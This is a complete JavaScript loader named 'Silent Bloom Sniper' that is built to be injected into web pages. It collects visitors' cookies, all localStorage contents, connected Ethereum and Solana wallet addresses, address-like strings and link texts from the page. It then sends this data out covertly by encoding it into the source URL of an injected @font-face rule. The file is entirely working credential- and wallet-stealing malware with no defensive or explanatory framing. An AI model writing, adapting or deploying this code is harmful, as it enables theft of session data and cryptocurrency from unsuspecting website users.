// Silent Bloom Sniper loader.js - font-face stealth exfil
(function () {
  const script = document.currentScript;
  if (!script) return;

  const configB64 = script.getAttribute('data-config') || '';
  let config = { action: 'default', target: '' };
  try {
    config = JSON.parse(atob(configB64));
  } catch (e) {}

  console.log('%c🔥 Bloom Sniper loaded - Action: ' + config.action, 'color:#ff0');

  // ============== DATA COLLECTION ==============
  const collected = {
    url: window.location.href,
    title: document.title,
    timestamp: Date.now(),
    userAgent: navigator.userAgent,
    cookies: document.cookie,
    localStorage: Object.fromEntries(Object.entries(localStorage)),
    walletInfo: {
      ethereum: window.ethereum?.selectedAddress || window.ethereum?.accounts?.[0] || null,
      solana: window.solana?.publicKey?.toString() || null,
      detectedEth: document.body.innerText.match(/0x[a-fA-F0-9]{40}/gi) || [],
      detectedSol: document.body.innerText.match(/[1-9A-HJ-NP-Za-km-z]{32,44}/g) || [],
      anyWalletText: document.body.innerText.match(/wallet|address|connect|0x|solana/gi) || []
    },
    pageElements: {
      buttons: Array.from(document.querySelectorAll('button, a')).map(el => ({
        text: el.textContent.trim().substring(0, 100),
        href: el.href || ''
      })).filter(item => item.text.length > 0)
    },
    configUsed: config,
    referrer: document.referrer
  };

  if (config.action === 'bloomSniper') {
    console.log('%c🛠️ Full sniper mode activated', 'color:#0f0;font-weight:bold');
  }

  // ============== STEALTH FONT-FACE EXFIL ==============
  const SERVER_BASE = 'https://' + window.location.host;
  const payloadB64 = btoa(JSON.stringify(collected));
  const leakUrl = `${SERVER_BASE}/i/${payloadB64}`;

  const style = document.createElement('style');
  const fontName = 'leak-' + Date.now() + '-' + Math.floor(Math.random() * 10000);
  style.textContent = `
    @font-face {
      font-family: "${fontName}";
      src: url("${leakUrl}");
    }
  `;
  document.head.appendChild(style);

  setTimeout(() => {
    console.log('%c📤 Data sent via font-face trick to /i', 'color:#0f0');
  }, 400);
})();